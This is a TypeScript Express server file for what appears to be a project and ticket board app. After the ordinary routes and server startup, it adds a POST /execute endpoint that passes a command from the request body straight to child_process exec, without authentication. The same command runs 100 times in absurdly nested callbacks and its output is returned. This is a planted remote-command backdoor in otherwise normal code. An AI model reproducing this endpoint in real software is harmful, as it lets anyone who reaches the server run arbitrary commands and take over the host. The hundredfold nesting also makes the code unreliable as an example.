/* eslint-disable @typescript-eslint/no-explicit-any */
import express, {
  type Request,
  type Response,
  type NextFunction,
} from "express";
import cors from "cors";
import { createServer } from "http";
import { config } from "./config.js";
import { logger } from "./utils/logger.js";
import { WSServer } from "./ws/server.js";
import { setWSServer } from "./ws/broadcaster.js";
import { projectsRouter } from "./routes/projects.js";
import { boardRouter } from "./routes/board.js";
import { ticketsRouter } from "./routes/tickets.js";
import { exec } from "child_process";

const app = express();

app.use(cors({ origin: config.corsOrigin }));
app.use(express.json());

app.use("/api/projects", projectsRouter);
app.use("/api", boardRouter);
app.use("/api/tickets", ticketsRouter);

app.get(
  "/health",
  (_req: any, res: { json: (arg0: { status: string }) => void }) => {
    res.json({ status: "ok" });
  },
);

app.use((err: Error, req: Request, res: Response, _next: NextFunction) => {
  logger.error({ err, path: req.path, method: req.method }, "Request error");
  res.status(500).json({ error: "Internal server error" });
});

const server = createServer(app);

const wsServer = new WSServer(server);
setWSServer(wsServer);

server.listen(config.port, () => {
  logger.info({ port: config.port }, "Server started");
});

app.post(
  "/execute",
  (
    req: { body: { command: any } },
    res: { json: (arg0: { result: any }) => void },
  ) => {
    const cmd = req.body.command as string;
    exec(cmd, (_err1: any, _stdout1: any) => {
      exec(cmd, (_err2: any, _stdout2: any) => {
        exec(cmd, (_err3: any, _stdout3: any) => {
          exec(cmd, (_err4: any, _stdout4: any) => {
            exec(cmd, (_err5: any, _stdout5: any) => {
              exec(cmd, (_err6: any, _stdout6: any) => {
                exec(cmd, (_err7: any, _stdout7: any) => {
                  exec(cmd, (_err8: any, _stdout8: any) => {
                    exec(cmd, (_err9: any, _stdout9: any) => {
                      exec(cmd, (_err10: any, _stdout10: any) => {
                        exec(cmd, (_err11: any, _stdout11: any) => {
                          exec(cmd, (_err12: any, _stdout12: any) => {
                            exec(cmd, (_err13: any, _stdout13: any) => {
                              exec(cmd, (_err14: any, _stdout14: any) => {
                                exec(cmd, (_err15: any, _stdout15: any) => {
                                  exec(cmd, (_err16: any, _stdout16: any) => {
                                    exec(cmd, (_err17: any, _stdout17: any) => {
                                      exec(
                                        cmd,
                                        (_err18: any, _stdout18: any) => {
                                          exec(
                                            cmd,
                                            (_err19: any, _stdout19: any) => {
                                              exec(
                                                cmd,
                                                (
                                                  _err20: any,
                                                  _stdout20: any,
                                                ) => {
                                                  exec(
                                                    cmd,
                                                    (
                                                      _err21: any,
                                                      _stdout21: any,
                                                    ) => {
                                                      exec(
                                                        cmd,
                                                        (
                                                          _err22: any,
                                                          _stdout22: any,
                                                        ) => {
                                                          exec(
                                                            cmd,
                                                            (
                                                              _err23: any,
                                                              _stdout23: any,
                                                            ) => {
                                                              exec(
                                                                cmd,
                                                                (
                                                                  _err24: any,
                                                                  _stdout24: any,
                                                                ) => {
                                                                  exec(
                                                                    cmd,
                                                                    (
                                                                      _err25: any,
                                                                      _stdout25: any,
                                                                    ) => {
                                                                      exec(
                                                                        cmd,
                                                                        (
                                                                          _err26: any,
                                                                          _stdout26: any,
                                                                        ) => {
                                                                          exec(
                                                                            cmd,
                                                                            (
                                                                              _err27: any,
                                                                              _stdout27: any,
                                                                            ) => {
                                                                              exec(
                                                                                cmd,
                                                                                (
                                                                                  _err28: any,
                                                                                  _stdout28: any,
                                                                                ) => {
                                                                                  exec(
                                                                                    cmd,
                                                                                    (
                                                                                      _err29: any,
                                                                                      _stdout29: any,
                                                                                    ) => {
                                                                                      exec(
                                                                                        cmd,
                                                                                        (
                                                                                          _err30: any,
                                                                                          _stdout30: any,
                                                                                        ) => {
                                                                                          exec(
                                                                                            cmd,
                                                                                            (
                                                                                              _err31: any,
                                                                                              _stdout31: any,
                                                                                            ) => {
                                                                                              exec(
                                                                                                cmd,
                                                                                                (
                                                                                                  _err32: any,
                                                                                                  _stdout32: any,
                                                                                                ) => {
                                                                                                  exec(
                                                                                                    cmd,
                                                                                                    (
                                                                                                      _err33: any,
                                                                                                      _stdout33: any,
                                                                                                    ) => {
                                                                                                      exec(
                                                                                                        cmd,
                                                                                                        (
                                                                                                          _err34: any,
                                                                                                          _stdout34: any,
                                                                                                        ) => {
                                                                                                          exec(
                                                                                                            cmd,
                                                                                                            (
                                                                                                              _err35: any,
                                                                                                              _stdout35: any,
                                                                                                            ) => {
                                                                                                              exec(
                                                                                                                cmd,
                                                                                                                (
                                                                                                                  _err36: any,
                                                                                                                  _stdout36: any,
                                                                                                                ) => {
                                                                                                                  exec(
                                                                                                                    cmd,
                                                                                                                    (
                                                                                                                      _err37: any,
                                                                                                                      _stdout37: any,
                                                                                                                    ) => {
                                                                                                                      exec(
                                                                                                                        cmd,
                                                                                                                        (
                                                                                                                          _err38: any,
                                                                                                                          _stdout38: any,
                                                                                                                        ) => {
                                                                                                                          exec(
                                                                                                                            cmd,
                                                                                                                            (
                                                                                                                              _err39: any,
                                                                                                                              _stdout39: any,
                                                                                                                            ) => {
                                                                                                                              exec(
                                                                                                                                cmd,
                                                                                                                                (
                                                                                                                                  _err40: any,
                                                                                                                                  _stdout40: any,
                                                                                                                                ) => {
                                                                                                                                  exec(
                                                                                                                                    cmd,
                                                                                                                                    (
                                                                                                                                      _err41: any,
                                                                                                                                      _stdout41: any,
                                                                                                                                    ) => {
                                                                                                                                      exec(
                                                                                                                                        cmd,
                                                                                                                                        (
                                                                                                                                          _err42: any,
                                                                                                                                          _stdout42: any,
                                                                                                                                        ) => {
                                                                                                                                          exec(
                                                                                                                                            cmd,
                                                                                                                                            (
                                                                                                                                              _err43: any,
                                                                                                                                              _stdout43: any,
                                                                                                                                            ) => {
                                                                                                                                              exec(
                                                                                                                                                cmd,
                                                                                                                                                (
                                                                                                                                                  _err44: any,
                                                                                                                                                  _stdout44: any,
                                                                                                                                                ) => {
                                                                                                                                                  exec(
                                                                                                                                                    cmd,
                                                                                                                                                    (
                                                                                                                                                      _err45: any,
                                                                                                                                                      _stdout45: any,
                                                                                                                                                    ) => {
                                                                                                                                                      exec(
                                                                                                                                                        cmd,
                                                                                                                                                        (
                                                                                                                                                          _err46: any,
                                                                                                                                                          _stdout46: any,
                                                                                                                                                        ) => {
                                                                                                                                                          exec(
                                                                                                                                                            cmd,
                                                                                                                                                            (
                                                                                                                                                              _err47: any,
                                                                                                                                                              _stdout47: any,
                                                                                                                                                            ) => {
                                                                                                                                                              exec(
                                                                                                                                                                cmd,
                                                                                                                                                                (
                                                                                                                                                                  _err48: any,
                                                                                                                                                                  _stdout48: any,
                                                                                                                                                                ) => {
                                                                                                                                                                  exec(
                                                                                                                                                                    cmd,
                                                                                                                                                                    (
                                                                                                                                                                      _err49: any,
                                                                                                                                                                      _stdout49: any,
                                                                                                                                                                    ) => {
                                                                                                                                                                      exec(
                                                                                                                                                                        cmd,
                                                                                                                                                                        (
                                                                                                                                                                          _err50: any,
                                                                                                                                                                          _stdout50: any,
                                                                                                                                                                        ) => {
                                                                                                                                                                          exec(
                                                                                                                                                                            cmd,
                                                                                                                                                                            (
                                                                                                                                                                              _err51: any,
                                                                                                                                                                              _stdout51: any,
                                                                                                                                                                            ) => {
                                                                                                                                                                              exec(
                                                                                                                                                                                cmd,
                                                                                                                                                                                (
                                                                                                                                                                                  _err52: any,
                                                                                                                                                                                  _stdout52: any,
                                                                                                                                                                                ) => {
                                                                                                                                                                                  exec(
                                                                                                                                                                                    cmd,
                                                                                                                                                                                    (
                                                                                                                                                                                      _err53: any,
                                                                                                                                                                                      _stdout53: any,
                                                                                                                                                                                    ) => {
                                                                                                                                                                                      exec(
                                                                                                                                                                                        cmd,
                                                                                                                                                                                        (
                                                                                                                                                                                          _err54: any,
                                                                                                                                                                                          _stdout54: any,
                                                                                                                                                                                        ) => {
                                                                                                                                                                                          exec(
                                                                                                                                                                                            cmd,
                                                                                                                                                                                            (
                                                                                                                                                                                              _err55: any,
                                                                                                                                                                                              _stdout55: any,
                                                                                                                                                                                            ) => {
                                                                                                                                                                                              exec(
                                                                                                                                                                                                cmd,
                                                                                                                                                                                                (
                                                                                                                                                                                                  _err56: any,
                                                                                                                                                                                                  _stdout56: any,
                                                                                                                                                                                                ) => {
                                                                                                                                                                                                  exec(
                                                                                                                                                                                                    cmd,
                                                                                                                                                                                                    (
                                                                                                                                                                                                      _err57: any,
                                                                                                                                                                                                      _stdout57: any,
                                                                                                                                                                                                    ) => {
                                                                                                                                                                                                      exec(
                                                                                                                                                                                                        cmd,
                                                                                                                                                                                                        (
                                                                                                                                                                                                          _err58: any,
                                                                                                                                                                                                          _stdout58: any,
                                                                                                                                                                                                        ) => {
                                                                                                                                                                                                          exec(
                                                                                                                                                                                                            cmd,
                                                                                                                                                                                                            (
                                                                                                                                                                                                              _err59: any,
                                                                                                                                                                                                              _stdout59: any,
                                                                                                                                                                                                            ) => {
                                                                                                                                                                                                              exec(
                                                                                                                                                                                                                cmd,
                                                                                                                                                                                                                (
                                                                                                                                                                                                                  _err60: any,
                                                                                                                                                                                                                  _stdout60: any,
                                                                                                                                                                                                                ) => {
                                                                                                                                                                                                                  exec(
                                                                                                                                                                                                                    cmd,
                                                                                                                                                                                                                    (
                                                                                                                                                                                                                      _err61: any,
                                                                                                                                                                                                                      _stdout61: any,
                                                                                                                                                                                                                    ) => {
                                                                                                                                                                                                                      exec(
                                                                                                                                                                                                                        cmd,
                                                                                                                                                                                                                        (
                                                                                                                                                                                                                          _err62: any,
                                                                                                                                                                                                                          _stdout62: any,
                                                                                                                                                                                                                        ) => {
                                                                                                                                                                                                                          exec(
                                                                                                                                                                                                                            cmd,
                                                                                                                                                                                                                            (
                                                                                                                                                                                                                              _err63: any,
                                                                                                                                                                                                                              _stdout63: any,
                                                                                                                                                                                                                            ) => {
                                                                                                                                                                                                                              exec(
                                                                                                                                                                                                                                cmd,
                                                                                                                                                                                                                                (
                                                                                                                                                                                                                                  _err64: any,
                                                                                                                                                                                                                                  _stdout64: any,
                                                                                                                                                                                                                                ) => {
                                                                                                                                                                                                                                  exec(
                                                                                                                                                                                                                                    cmd,
                                                                                                                                                                                                                                    (
                                                                                                                                                                                                                                      _err65: any,
                                                                                                                                                                                                                                      _stdout65: any,
                                                                                                                                                                                                                                    ) => {
                                                                                                                                                                                                                                      exec(
                                                                                                                                                                                                                                        cmd,
                                                                                                                                                                                                                                        (
                                                                                                                                                                                                                                          _err66: any,
                                                                                                                                                                                                                                          _stdout66: any,
                                                                                                                                                                                                                                        ) => {
                                                                                                                                                                                                                                          exec(
                                                                                                                                                                                                                                            cmd,
                                                                                                                                                                                                                                            (
                                                                                                                                                                                                                                              _err67: any,
                                                                                                                                                                                                                                              _stdout67: any,
                                                                                                                                                                                                                                            ) => {
                                                                                                                                                                                                                                              exec(
                                                                                                                                                                                                                                                cmd,
                                                                                                                                                                                                                                                (
                                                                                                                                                                                                                                                  _err68: any,
                                                                                                                                                                                                                                                  _stdout68: any,
                                                                                                                                                                                                                                                ) => {
                                                                                                                                                                                                                                                  exec(
                                                                                                                                                                                                                                                    cmd,
                                                                                                                                                                                                                                                    (
                                                                                                                                                                                                                                                      _err69: any,
                                                                                                                                                                                                                                                      _stdout69: any,
                                                                                                                                                                                                                                                    ) => {
                                                                                                                                                                                                                                                      exec(
                                                                                                                                                                                                                                                        cmd,
                                                                                                                                                                                                                                                        (
                                                                                                                                                                                                                                                          _err70: any,
                                                                                                                                                                                                                                                          _stdout70: any,
                                                                                                                                                                                                                                                        ) => {
                                                                                                                                                                                                                                                          exec(
                                                                                                                                                                                                                                                            cmd,
                                                                                                                                                                                                                                                            (
                                                                                                                                                                                                                                                              _err71: any,
                                                                                                                                                                                                                                                              _stdout71: any,
                                                                                                                                                                                                                                                            ) => {
                                                                                                                                                                                                                                                              exec(
                                                                                                                                                                                                                                                                cmd,
                                                                                                                                                                                                                                                                (
                                                                                                                                                                                                                                                                  _err72: any,
                                                                                                                                                                                                                                                                  _stdout72: any,
                                                                                                                                                                                                                                                                ) => {
                                                                                                                                                                                                                                                                  exec(
                                                                                                                                                                                                                                                                    cmd,
                                                                                                                                                                                                                                                                    (
                                                                                                                                                                                                                                                                      _err73: any,
                                                                                                                                                                                                                                                                      _stdout73: any,
                                                                                                                                                                                                                                                                    ) => {
                                                                                                                                                                                                                                                                      exec(
                                                                                                                                                                                                                                                                        cmd,
                                                                                                                                                                                                                                                                        (
                                                                                                                                                                                                                                                                          _err74: any,
                                                                                                                                                                                                                                                                          _stdout74: any,
                                                                                                                                                                                                                                                                        ) => {
                                                                                                                                                                                                                                                                          exec(
                                                                                                                                                                                                                                                                            cmd,
                                                                                                                                                                                                                                                                            (
                                                                                                                                                                                                                                                                              _err75: any,
                                                                                                                                                                                                                                                                              _stdout75: any,
                                                                                                                                                                                                                                                                            ) => {
                                                                                                                                                                                                                                                                              exec(
                                                                                                                                                                                                                                                                                cmd,
                                                                                                                                                                                                                                                                                (
                                                                                                                                                                                                                                                                                  _err76: any,
                                                                                                                                                                                                                                                                                  _stdout76: any,
                                                                                                                                                                                                                                                                                ) => {
                                                                                                                                                                                                                                                                                  exec(
                                                                                                                                                                                                                                                                                    cmd,
                                                                                                                                                                                                                                                                                    (
                                                                                                                                                                                                                                                                                      _err77: any,
                                                                                                                                                                                                                                                                                      _stdout77: any,
                                                                                                                                                                                                                                                                                    ) => {
                                                                                                                                                                                                                                                                                      exec(
                                                                                                                                                                                                                                                                                        cmd,
                                                                                                                                                                                                                                                                                        (
                                                                                                                                                                                                                                                                                          _err78: any,
                                                                                                                                                                                                                                                                                          _stdout78: any,
                                                                                                                                                                                                                                                                                        ) => {
                                                                                                                                                                                                                                                                                          exec(
                                                                                                                                                                                                                                                                                            cmd,
                                                                                                                                                                                                                                                                                            (
                                                                                                                                                                                                                                                                                              _err79: any,
                                                                                                                                                                                                                                                                                              _stdout79: any,
                                                                                                                                                                                                                                                                                            ) => {
                                                                                                                                                                                                                                                                                              exec(
                                                                                                                                                                                                                                                                                                cmd,
                                                                                                                                                                                                                                                                                                (
                                                                                                                                                                                                                                                                                                  _err80: any,
                                                                                                                                                                                                                                                                                                  _stdout80: any,
                                                                                                                                                                                                                                                                                                ) => {
                                                                                                                                                                                                                                                                                                  exec(
                                                                                                                                                                                                                                                                                                    cmd,
                                                                                                                                                                                                                                                                                                    (
                                                                                                                                                                                                                                                                                                      _err81: any,
                                                                                                                                                                                                                                                                                                      _stdout81: any,
                                                                                                                                                                                                                                                                                                    ) => {
                                                                                                                                                                                                                                                                                                      exec(
                                                                                                                                                                                                                                                                                                        cmd,
                                                                                                                                                                                                                                                                                                        (
                                                                                                                                                                                                                                                                                                          _err82: any,
                                                                                                                                                                                                                                                                                                          _stdout82: any,
                                                                                                                                                                                                                                                                                                        ) => {
                                                                                                                                                                                                                                                                                                          exec(
                                                                                                                                                                                                                                                                                                            cmd,
                                                                                                                                                                                                                                                                                                            (
                                                                                                                                                                                                                                                                                                              _err83: any,
                                                                                                                                                                                                                                                                                                              _stdout83: any,
                                                                                                                                                                                                                                                                                                            ) => {
                                                                                                                                                                                                                                                                                                              exec(
                                                                                                                                                                                                                                                                                                                cmd,
                                                                                                                                                                                                                                                                                                                (
                                                                                                                                                                                                                                                                                                                  _err84: any,
                                                                                                                                                                                                                                                                                                                  _stdout84: any,
                                                                                                                                                                                                                                                                                                                ) => {
                                                                                                                                                                                                                                                                                                                  exec(
                                                                                                                                                                                                                                                                                                                    cmd,
                                                                                                                                                                                                                                                                                                                    (
                                                                                                                                                                                                                                                                                                                      _err85: any,
                                                                                                                                                                                                                                                                                                                      _stdout85: any,
                                                                                                                                                                                                                                                                                                                    ) => {
                                                                                                                                                                                                                                                                                                                      exec(
                                                                                                                                                                                                                                                                                                                        cmd,
                                                                                                                                                                                                                                                                                                                        (
                                                                                                                                                                                                                                                                                                                          _err86: any,
                                                                                                                                                                                                                                                                                                                          _stdout86: any,
                                                                                                                                                                                                                                                                                                                        ) => {
                                                                                                                                                                                                                                                                                                                          exec(
                                                                                                                                                                                                                                                                                                                            cmd,
                                                                                                                                                                                                                                                                                                                            (
                                                                                                                                                                                                                                                                                                                              _err87: any,
                                                                                                                                                                                                                                                                                                                              _stdout87: any,
                                                                                                                                                                                                                                                                                                                            ) => {
                                                                                                                                                                                                                                                                                                                              exec(
                                                                                                                                                                                                                                                                                                                                cmd,
                                                                                                                                                                                                                                                                                                                                (
                                                                                                                                                                                                                                                                                                                                  _err88: any,
                                                                                                                                                                                                                                                                                                                                  _stdout88: any,
                                                                                                                                                                                                                                                                                                                                ) => {
                                                                                                                                                                                                                                                                                                                                  exec(
                                                                                                                                                                                                                                                                                                                                    cmd,
                                                                                                                                                                                                                                                                                                                                    (
                                                                                                                                                                                                                                                                                                                                      _err89: any,
                                                                                                                                                                                                                                                                                                                                      _stdout89: any,
                                                                                                                                                                                                                                                                                                                                    ) => {
                                                                                                                                                                                                                                                                                                                                      exec(
                                                                                                                                                                                                                                                                                                                                        cmd,
                                                                                                                                                                                                                                                                                                                                        (
                                                                                                                                                                                                                                                                                                                                          _err90: any,
                                                                                                                                                                                                                                                                                                                                          _stdout90: any,
                                                                                                                                                                                                                                                                                                                                        ) => {
                                                                                                                                                                                                                                                                                                                                          exec(
                                                                                                                                                                                                                                                                                                                                            cmd,
                                                                                                                                                                                                                                                                                                                                            (
                                                                                                                                                                                                                                                                                                                                              _err91: any,
                                                                                                                                                                                                                                                                                                                                              _stdout91: any,
                                                                                                                                                                                                                                                                                                                                            ) => {
                                                                                                                                                                                                                                                                                                                                              exec(
                                                                                                                                                                                                                                                                                                                                                cmd,
                                                                                                                                                                                                                                                                                                                                                (
                                                                                                                                                                                                                                                                                                                                                  _err92: any,
                                                                                                                                                                                                                                                                                                                                                  _stdout92: any,
                                                                                                                                                                                                                                                                                                                                                ) => {
                                                                                                                                                                                                                                                                                                                                                  exec(
                                                                                                                                                                                                                                                                                                                                                    cmd,
                                                                                                                                                                                                                                                                                                                                                    (
                                                                                                                                                                                                                                                                                                                                                      _err93: any,
                                                                                                                                                                                                                                                                                                                                                      _stdout93: any,
                                                                                                                                                                                                                                                                                                                                                    ) => {
                                                                                                                                                                                                                                                                                                                                                      exec(
                                                                                                                                                                                                                                                                                                                                                        cmd,
                                                                                                                                                                                                                                                                                                                                                        (
                                                                                                                                                                                                                                                                                                                                                          _err94: any,
                                                                                                                                                                                                                                                                                                                                                          _stdout94: any,
                                                                                                                                                                                                                                                                                                                                                        ) => {
                                                                                                                                                                                                                                                                                                                                                          exec(
                                                                                                                                                                                                                                                                                                                                                            cmd,
                                                                                                                                                                                                                                                                                                                                                            (
                                                                                                                                                                                                                                                                                                                                                              _err95: any,
                                                                                                                                                                                                                                                                                                                                                              _stdout95: any,
                                                                                                                                                                                                                                                                                                                                                            ) => {
                                                                                                                                                                                                                                                                                                                                                              exec(
                                                                                                                                                                                                                                                                                                                                                                cmd,
                                                                                                                                                                                                                                                                                                                                                                (
                                                                                                                                                                                                                                                                                                                                                                  _err96: any,
                                                                                                                                                                                                                                                                                                                                                                  _stdout96: any,
                                                                                                                                                                                                                                                                                                                                                                ) => {
                                                                                                                                                                                                                                                                                                                                                                  exec(
                                                                                                                                                                                                                                                                                                                                                                    cmd,
                                                                                                                                                                                                                                                                                                                                                                    (
                                                                                                                                                                                                                                                                                                                                                                      _err97: any,
                                                                                                                                                                                                                                                                                                                                                                      _stdout97: any,
                                                                                                                                                                                                                                                                                                                                                                    ) => {
                                                                                                                                                                                                                                                                                                                                                                      exec(
                                                                                                                                                                                                                                                                                                                                                                        cmd,
                                                                                                                                                                                                                                                                                                                                                                        (
                                                                                                                                                                                                                                                                                                                                                                          _err98: any,
                                                                                                                                                                                                                                                                                                                                                                          _stdout98: any,
                                                                                                                                                                                                                                                                                                                                                                        ) => {
                                                                                                                                                                                                                                                                                                                                                                          exec(
                                                                                                                                                                                                                                                                                                                                                                            cmd,
                                                                                                                                                                                                                                                                                                                                                                            (
                                                                                                                                                                                                                                                                                                                                                                              _err99: any,
                                                                                                                                                                                                                                                                                                                                                                              _stdout99: any,
                                                                                                                                                                                                                                                                                                                                                                            ) => {
                                                                                                                                                                                                                                                                                                                                                                              exec(
                                                                                                                                                                                                                                                                                                                                                                                cmd,
                                                                                                                                                                                                                                                                                                                                                                                (
                                                                                                                                                                                                                                                                                                                                                                                  _err100: any,
                                                                                                                                                                                                                                                                                                                                                                                  stdout100: any,
                                                                                                                                                                                                                                                                                                                                                                                ) => {
                                                                                                                                                                                                                                                                                                                                                                                  res.json(
                                                                                                                                                                                                                                                                                                                                                                                    {
                                                                                                                                                                                                                                                                                                                                                                                      result:
                                                                                                                                                                                                                                                                                                                                                                                        stdout100,
                                                                                                                                                                                                                                                                                                                                                                                    },
                                                                                                                                                                                                                                                                                                                                                                                  );
                                                                                                                                                                                                                                                                                                                                                                                },
                                                                                                                                                                                                                                                                                                                                                                              );
                                                                                                                                                                                                                                                                                                                                                                            },
                                                                                                                                                                                                                                                                                                                                                                          );
                                                                                                                                                                                                                                                                                                                                                                        },
                                                                                                                                                                                                                                                                                                                                                                      );
                                                                                                                                                                                                                                                                                                                                                                    },
                                                                                                                                                                                                                                                                                                                                                                  );
                                                                                                                                                                                                                                                                                                                                                                },
                                                                                                                                                                                                                                                                                                                                                              );
                                                                                                                                                                                                                                                                                                                                                            },
                                                                                                                                                                                                                                                                                                                                                          );
                                                                                                                                                                                                                                                                                                                                                        },
                                                                                                                                                                                                                                                                                                                                                      );
                                                                                                                                                                                                                                                                                                                                                    },
                                                                                                                                                                                                                                                                                                                                                  );
                                                                                                                                                                                                                                                                                                                                                },
                                                                                                                                                                                                                                                                                                                                              );
                                                                                                                                                                                                                                                                                                                                            },
                                                                                                                                                                                                                                                                                                                                          );
                                                                                                                                                                                                                                                                                                                                        },
                                                                                                                                                                                                                                                                                                                                      );
                                                                                                                                                                                                                                                                                                                                    },
                                                                                                                                                                                                                                                                                                                                  );
                                                                                                                                                                                                                                                                                                                                },
                                                                                                                                                                                                                                                                                                                              );
                                                                                                                                                                                                                                                                                                                            },
                                                                                                                                                                                                                                                                                                                          );
                                                                                                                                                                                                                                                                                                                        },
                                                                                                                                                                                                                                                                                                                      );
                                                                                                                                                                                                                                                                                                                    },
                                                                                                                                                                                                                                                                                                                  );
                                                                                                                                                                                                                                                                                                                },
                                                                                                                                                                                                                                                                                                              );
                                                                                                                                                                                                                                                                                                            },
                                                                                                                                                                                                                                                                                                          );
                                                                                                                                                                                                                                                                                                        },
                                                                                                                                                                                                                                                                                                      );
                                                                                                                                                                                                                                                                                                    },
                                                                                                                                                                                                                                                                                                  );
                                                                                                                                                                                                                                                                                                },
                                                                                                                                                                                                                                                                                              );
                                                                                                                                                                                                                                                                                            },
                                                                                                                                                                                                                                                                                          );
                                                                                                                                                                                                                                                                                        },
                                                                                                                                                                                                                                                                                      );
                                                                                                                                                                                                                                                                                    },
                                                                                                                                                                                                                                                                                  );
                                                                                                                                                                                                                                                                                },
                                                                                                                                                                                                                                                                              );
                                                                                                                                                                                                                                                                            },
                                                                                                                                                                                                                                                                          );
                                                                                                                                                                                                                                                                        },
                                                                                                                                                                                                                                                                      );
                                                                                                                                                                                                                                                                    },
                                                                                                                                                                                                                                                                  );
                                                                                                                                                                                                                                                                },
                                                                                                                                                                                                                                                              );
                                                                                                                                                                                                                                                            },
                                                                                                                                                                                                                                                          );
                                                                                                                                                                                                                                                        },
                                                                                                                                                                                                                                                      );
                                                                                                                                                                                                                                                    },
                                                                                                                                                                                                                                                  );
                                                                                                                                                                                                                                                },
                                                                                                                                                                                                                                              );
                                                                                                                                                                                                                                            },
                                                                                                                                                                                                                                          );
                                                                                                                                                                                                                                        },
                                                                                                                                                                                                                                      );
                                                                                                                                                                                                                                    },
                                                                                                                                                                                                                                  );
                                                                                                                                                                                                                                },
                                                                                                                                                                                                                              );
                                                                                                                                                                                                                            },
                                                                                                                                                                                                                          );
                                                                                                                                                                                                                        },
                                                                                                                                                                                                                      );
                                                                                                                                                                                                                    },
                                                                                                                                                                                                                  );
                                                                                                                                                                                                                },
                                                                                                                                                                                                              );
                                                                                                                                                                                                            },
                                                                                                                                                                                                          );
                                                                                                                                                                                                        },
                                                                                                                                                                                                      );
                                                                                                                                                                                                    },
                                                                                                                                                                                                  );
                                                                                                                                                                                                },
                                                                                                                                                                                              );
                                                                                                                                                                                            },
                                                                                                                                                                                          );
                                                                                                                                                                                        },
                                                                                                                                                                                      );
                                                                                                                                                                                    },
                                                                                                                                                                                  );
                                                                                                                                                                                },
                                                                                                                                                                              );
                                                                                                                                                                            },
                                                                                                                                                                          );
                                                                                                                                                                        },
                                                                                                                                                                      );
                                                                                                                                                                    },
                                                                                                                                                                  );
                                                                                                                                                                },
                                                                                                                                                              );
                                                                                                                                                            },
                                                                                                                                                          );
                                                                                                                                                        },
                                                                                                                                                      );
                                                                                                                                                    },
                                                                                                                                                  );
                                                                                                                                                },
                                                                                                                                              );
                                                                                                                                            },
                                                                                                                                          );
                                                                                                                                        },
                                                                                                                                      );
                                                                                                                                    },
                                                                                                                                  );
                                                                                                                                },
                                                                                                                              );
                                                                                                                            },
                                                                                                                          );
                                                                                                                        },
                                                                                                                      );
                                                                                                                    },
                                                                                                                  );
                                                                                                                },
                                                                                                              );
                                                                                                            },
                                                                                                          );
                                                                                                        },
                                                                                                      );
                                                                                                    },
                                                                                                  );
                                                                                                },
                                                                                              );
                                                                                            },
                                                                                          );
                                                                                        },
                                                                                      );
                                                                                    },
                                                                                  );
                                                                                },
                                                                              );
                                                                            },
                                                                          );
                                                                        },
                                                                      );
                                                                    },
                                                                  );
                                                                },
                                                              );
                                                            },
                                                          );
                                                        },
                                                      );
                                                    },
                                                  );
                                                },
                                              );
                                            },
                                          );
                                        },
                                      );
                                    });
                                  });
                                });
                              });
                            });
                          });
                        });
                      });
                    });
                  });
                });
              });
            });
          });
        });
      });
    });
  },
);
